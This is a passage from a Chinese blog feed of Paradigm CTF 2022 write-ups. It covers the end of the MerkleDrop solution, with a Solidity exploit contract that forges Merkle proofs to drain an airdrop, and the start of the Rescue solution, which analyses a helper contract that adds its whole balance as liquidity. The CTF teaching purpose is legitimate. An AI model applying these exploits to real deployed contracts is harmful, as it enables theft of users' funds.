account, amount));</span><br><span class="line">        require(MerkleProof.verify(merkleProof, merkleRoot, node), &#39;MerkleDistributor: Invalid proof.&#39;);</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>claim里的node节点hash计算方式是先<code>abi.encodePacked(index, account, amount)</code>再hash。而这里的三个字段为</p><ul><li>index[uint256]: 32bytes</li><li>account[address]:20bytes</li><li>amount[uint96]:12bytes</li></ul><p>这三个字段加起来刚好是64bytes。正好是两个 keccak256 hash 结果拼接在一起的大小。可以看成是其中一个 hash 值作为 index, 另一个 hash 值作为 account + amount。</p><p>那我们就可以利用此巧合去构造一个假的输入，而这个输入可以完美通过hash验证。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>现在的重点就是去构造这个”巧合的哈希“</p><p>空投的总数量为7500个ETH，即0x0fe1c215e8f838e00000，而uint96的最大值为0xffffffffffffffffffffffff，很明显，如果是随机的哈希结果，是会远远大于空投的总数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffffffffffffff</span><br><span class="line">0x00000fe1c215e8f838e00000</span><br></pre></td></tr></table></figure><p>二者至少差了5个0，不过这也给我们提供了一个思路，我们去tree.json搜一下有5个连续0的哈希。</p><p><img src="C:\Users\小栩\Documents\GitHub\Conract_Attack\images\ParadigmCTF\2022\marklejson_serch.png" alt=""></p><p>很容易发现37这个节点</p><p>更巧合的是从第一个0处把这个哈希截断的话，前一部分刚好是20bytes,后一部分刚好是12bytes。换句话说，这个哈希可以被解析为<code>account + amount</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">account: 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A</span><br><span class="line">amount: 0x00000f40f0c122ae08d2207b</span><br></pre></td></tr></table></figure><p>来看看<code>MerkleProof</code>里是怎么验证节点的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function verify(</span><br><span class="line">    bytes32[] memory proof,</span><br><span class="line">    bytes32 root,</span><br><span class="line">    bytes32 leaf</span><br><span class="line">  )</span><br><span class="line">    internal</span><br><span class="line">    pure</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    bytes32 computedHash &#x3D; leaf;</span><br><span class="line"></span><br><span class="line">    for (uint256 i &#x3D; 0; i &lt; proof.length; i++) &#123;</span><br><span class="line">      bytes32 proofElement &#x3D; proof[i];</span><br><span class="line"></span><br><span class="line">      if (computedHash &lt; proofElement) &#123;</span><br><span class="line">        &#x2F;&#x2F; Hash(current computed hash + current element of the proof)</span><br><span class="line">        computedHash &#x3D; keccak256(abi.encodePacked(computedHash, proofElement));</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; Hash(current element of the proof + current computed hash)</span><br><span class="line">        computedHash &#x3D; keccak256(abi.encodePacked(proofElement, computedHash));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check if the computed hash (root) is equal to the provided root</span><br><span class="line">    return computedHash &#x3D;&#x3D; root;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实验证过程和merkletree的标准实现一样，将叶子节点和验证节点自下而上，两两哈希拼接在一起后再取哈希，最终和root哈希比较是否相等。</p><p>那么由于之前的巧合，我们可以通过index为37节点的第一个proof节点为突破口。</p><blockquote><p>由于验证过程的第一次验证（被验证节点和第一个proof节点hex）也是需要37号节点的哈希和我们的“突破口”哈希拼接后再取哈希进行后面的操作。</p><p>那么我们就可以在第一次验证的这个点做文章了</p></blockquote><p>我们回过头来看一看<code>claim</code>函数里面是怎么计算的节点哈希：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 node &#x3D; keccak256(abi.encodePacked(index, account, amount));</span><br></pre></td></tr></table></figure><p>之前讲到，<code>index</code>可以看作前哈希，<code>account</code>和<code>amount</code>可以看作后哈希，那么我们就可以直接构造出第一次验证时的拼接。</p><p>也就是说我们可以完美的用“意外”的参数通过验证。</p><p>但此时<code>account</code>为<code>0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A</code>,amount为<code>0x00000f40f0c122ae08d2207b</code>这都是意外的参数。而<code>amount</code>换算之后刚好小于75</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">计算一下还剩多少token未领</span><br><span class="line">0x0fe1c215e8f838e00000 - 0x00000f40f0c122ae08d2207b &#x3D; </span><br><span class="line">0xa0d154c64a300ddf85</span><br></pre></td></tr></table></figure><p>而这个amout刚好与index为8的节点amout相同，那么只要通过这个叶子节点，就可以领完空投合约里的所有token，解决本题。</p><p>附exploit合约</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    constructor(Setup setup) &#123;</span><br><span class="line">        MerkleDistributor merkleDistributor &#x3D; setup.merkleDistributor();</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F;通过拼接哈希，跳过第一个验证节点。</span><br><span class="line">        bytes32[] memory merkleProof1 &#x3D; new bytes32[](5);</span><br><span class="line">        merkleProof1[0] &#x3D; bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d);</span><br><span class="line">        merkleProof1[1] &#x3D; bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde);</span><br><span class="line">        merkleProof1[2] &#x3D; bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813);</span><br><span class="line">        merkleProof1[3] &#x3D; bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">        merkleProof1[4] &#x3D; bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">        merkleDistributor.claim(</span><br><span class="line">                0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, </span><br><span class="line">                address(0x00d48451c19959e2d9bd4e620fbe88aa5f6f7ea72a), </span><br><span class="line">                0x00000f40f0c122ae08d2207b,</span><br><span class="line">                merkleProof1</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;用index 8取完剩下的token即可</span><br><span class="line">        bytes32[] memory merkleProof2 &#x3D; new bytes32[](6);</span><br><span class="line">        merkleProof2[0] &#x3D; bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);</span><br><span class="line">        merkleProof2[1] &#x3D; bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);</span><br><span class="line">        merkleProof2[2] &#x3D; bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);</span><br><span class="line">        merkleProof2[3] &#x3D; bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);</span><br><span class="line">        merkleProof2[4] &#x3D; bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">        merkleProof2[5] &#x3D; bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">        merkleDistributor.claim(8, address(0x249934e4C5b838F920883a9f3ceC255C0aB3f827), 0xa0d154c64a300ddf85, merkleProof2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附hardhat测试用例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line">describe(<span class="string">"Challange merkleDrop"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"MerkleSetup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"75"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ExploitFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"MerkleDropExploit"</span>,attacker);</span><br><span class="line">        <span class="keyword">await</span> ExploitFactory.deploy(setup.address);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paradigm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paradigm 题解 Rescue</title>
      <link href="/paradigm22-rescue/"/>
      <url>/paradigm22-rescue/</url>
      
        <content type="html"><![CDATA[<h1 id="paradigm-2022-ctf-题解——Rescue"><a href="#paradigm-2022-ctf-题解——Rescue" class="headerlink" title="paradigm 2022 ctf 题解——Rescue"></a>paradigm 2022 ctf 题解——Rescue</h1><hr><pre><code>author：Thomas_Xu</code></pre><p><strong>环境配置</strong>:<br>由于题目环境需要使用docker，环境配置有点繁琐。我重新搭了一个hardhat框架的测试环境,而由于题目出在以太坊的主链上,并使用<code>Alchemy</code>fork了一个主网节点进行测试.</p><h2 id="Resucue"><a href="#Resucue" class="headerlink" title="Resucue"></a>Resucue</h2><p>首先先来看一下这道题目的描述:<code>I accidentally sent some WETH to a contract, can you help me?</code>看起来像是由于操作失误,导致像一个合约转了一些ETH,想要完成此Challange就必须试图挽救一下这笔损失.<br>接下来看一看合约代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;MasterChefHelper.sol&quot;;</span><br><span class="line">interface WETH9 is ERC20Like &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    </span><br><span class="line">    WETH9 public constant weth &#x3D; WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line">    MasterChefHelper public immutable mcHelper;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        mcHelper &#x3D; new MasterChefHelper();</span><br><span class="line">        weth.deposit&#123;value: 10 ether&#125;();</span><br><span class="line">        weth.transfer(address(mcHelper), 10 ether); &#x2F;&#x2F; whoops</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) &#123;</span><br><span class="line">        return weth.balanceOf(address(mcHelper)) &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是<code>Setup</code>合约,从中我们可以获取以下信息:</p><ol><li>我们不小心向<code>mcHelper</code>合约转了10 <code>ether</code></li><li>完成Challange的条件是要求<code>mcHelper</code>合约里没有这笔钱<code>return weth.balanceOf(address(mcHelper)) == 0;</code><br>所以我们可能并不是要做到把这笔钱转回到我们账户上,而是只需要使这10个ETH从<code>mcHelper</code>消失即可.</li></ol><p>有了上面的分析,似乎已经有了眉目,接下来分析<code>MasterChefLike</code>合约:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;UniswapV2Like.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface ERC20Like &#123;</span><br><span class="line">    function transferFrom(address, address, uint) external;</span><br><span class="line">    function transfer(address, uint) external;</span><br><span class="line">    function approve(address, uint) external;</span><br><span class="line">    function balanceOf(address) external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface MasterChefLike &#123;</span><br><span class="line">    function poolInfo(uint256 id) external returns (</span><br><span class="line">        address lpToken,</span><br><span class="line">        uint256 allocPoint,</span><br><span class="line">        uint256 lastRewardBlock,</span><br><span class="line">        uint256 accSushiPerShare</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MasterChefHelper &#123;</span><br><span class="line"></span><br><span class="line">    MasterChefLike public constant masterchef &#x3D; MasterChefLike(0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd);</span><br><span class="line">    UniswapV2RouterLike public constant router &#x3D; UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);</span><br><span class="line"></span><br><span class="line">    function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external &#123;</span><br><span class="line">        (address lpToken,,,) &#x3D; masterchef.poolInfo(poolId);</span><br><span class="line">        address tokenOut0 &#x3D; UniswapV2PairLike(lpToken).token0();</span><br><span class="line">        address tokenOut1 &#x3D; UniswapV2PairLike(lpToken).token1();</span><br><span class="line"></span><br><span class="line">        ERC20Like(tokenIn).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; swap for both tokens of the lp pool</span><br><span class="line">        _swap(tokenIn, tokenOut0, amountIn &#x2F; 2);</span><br><span class="line">        _swap(tokenIn, tokenOut1, amountIn &#x2F; 2);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; add liquidity and give lp tokens to msg.sender</span><br><span class="line">        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal &#123;</span><br><span class="line">        (,, uint256 amountOut) &#x3D; router.addLiquidity(</span><br><span class="line">            token0, </span><br><span class="line">            token1, </span><br><span class="line">            ERC20Like(token0).balanceOf(address(this)), </span><br><span class="line">            ERC20Like(token1).balanceOf(address(this)),             &#x2F;&#x2F;WETH</span><br><span class="line">            0, </span><br><span class="line">            0, </span><br><span class="line">            msg.sender, </span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        require(amountOut &gt;&#x3D; minAmountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal &#123;</span><br><span class="line">        address[] memory path &#x3D; new address[](2);</span><br><span class="line">        path[0] &#x3D; tokenIn;</span><br><span class="line">        path[1] &#x3D; tokenOut;</span><br><span class="line">        router.swapExactTokensForTokens(</span><br><span class="line">            amountIn,</span><br><span class="line">            0,</span><br><span class="line">            path,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这个合约只有一个外部调用函数:<code>swapTokenForPoolToken()</code>所以我们可以集中目光研究此函数即可.<br>接下来我们一步一步分析这个函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external &#123;</span><br><span class="line">        (address lpToken,,,) &#x3D; masterchef.poolInfo(poolId);&#x2F;&#x2F;获取poolId对应交易池</span><br><span class="line">        address tokenOut0 &#x3D; UniswapV2PairLike(lpToken).token0();&#x2F;&#x2F;获取交易池对应的token</span><br><span class="line">        address tokenOut1 &#x3D; UniswapV2PairLike(lpToken).token1();</span><br><span class="line"></span><br><span class="line">        ERC20Like(tokenIn).approve(address(router), type(uint256).max);&#x2F;&#x2F;每个token都给router授权</span><br><span class="line">        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);</span><br><span class="line">        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);&#x2F;&#x2F;将要兑换的Weth发送到此合约</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; swap for both tokens of the lp pool</span><br><span class="line">        _swap(tokenIn, tokenOut0, amountIn &#x2F; 2);&#x2F;&#x2F;将兑换的Weth分别交换为两种token</span><br><span class="line">        _swap(tokenIn, tokenOut1, amountIn &#x2F; 2);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; add liquidity and give lp tokens to msg.sender</span><br><span class="line">        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在函数最后调用了一个添加流动性的函数，这可能就是这笔误转账最终的去向</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal &#123;</span><br><span class="line">        (,, uint256 amountOut) &#x3D; router.addLiquidity(</span><br><span class="line">            token0, </span><br><span class="line">            token1, </span><br><span class="line">            ERC20Like(token0).balanceOf(address(this)), &#x2F;&#x2F;漏洞所在</span><br><span class="line">            ERC20Like(token1).balanceOf(address(this)),             &#x2F;&#x2F;</span><br><span class="line">            0, </span><br><span class="line">            0, </span><br><span class="line">            msg.sender, </span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">        require(amountOut &gt;&#x3D; minAmountOut);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>不难发现，这里添加流动性时，居然是把自己所有的余额全部发送到router里去<code>addLiquidity</code>，这是明显不合理的，只要我们能控制以下交易对的交换额，我们就可以把此合约的ETH余额全部加入到流动性池子当中。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>对应以上的分析，想要解决此<code>Challange</code>,我们还得到两种token去控制流动性兑换的数量。</p><p>这里我们选择usdc和dai，在<code>etherscan</code>里可以查到<code>poolId</code>为1的时候对应的pair就是usdc和Weth,并可获得token对应的地址<br><img src="CTF01.png" alt=""><br><img src="CTF02.png" alt=""><br><img src="CTF03.png" alt=""></p><p>当然我们也可以用脚本来获取交易对信息:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"><span class="keyword">const</span> masterLike = <span class="built_in">require</span>(<span class="string">'../contracts/rescue/MatserChefLike.json'</span>)</span><br><span class="line">describe(<span class="string">"Challange rescue"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> Weth = <span class="keyword">await</span> ethers.getContractAt(<span class="string">"WETH9"</span>,<span class="string">"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"</span>, attacker);</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Setup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"50"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line">        <span class="keyword">let</span> abi = [&#123;<span class="string">"inputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"id"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"poolInfo"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">"lpToken"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"allocPoint"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"lastRewardBlock"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;,&#123;<span class="string">"internalType"</span>:<span class="string">"uint256"</span>,<span class="string">"name"</span>:<span class="string">"accSushiPerShare"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;];</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">let</span> UniswapV2pairLikeAbi = [&#123;<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"token0"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"token1"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"internalType"</span>:<span class="string">"address"</span>,<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;];</span><br><span class="line"></span><br><span class="line">        erc20_abi = [&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"name"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"string"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span 